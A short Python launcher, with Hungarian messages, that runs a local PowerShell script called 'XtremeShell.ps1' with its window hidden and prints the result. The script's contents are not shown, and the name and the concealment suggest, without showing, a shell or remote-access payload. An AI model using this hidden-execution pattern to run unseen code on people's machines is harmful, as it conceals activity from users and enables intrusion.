import subprocess
import os

def run_ps1_file(file_name):
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, file_name)
        
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f"A fájl nem található: {file_path}")
        
        result = subprocess.run(["powershell.exe", "-WindowStyle", hidden, "-File", file_path], capture_output=True, text=True)
        
        print("Kimenet:\n", result.stdout)
        print("Hiba:\n", result.stderr)
    except FileNotFoundError as e:
        print(e)
    except Exception as e:
        print(f"Hiba történt a fájl futtatása közben: {e}")

ps1_file_name = 'XtremeShell.ps1'
hidden = 'Hidden'

run_ps1_file(ps1_file_name)
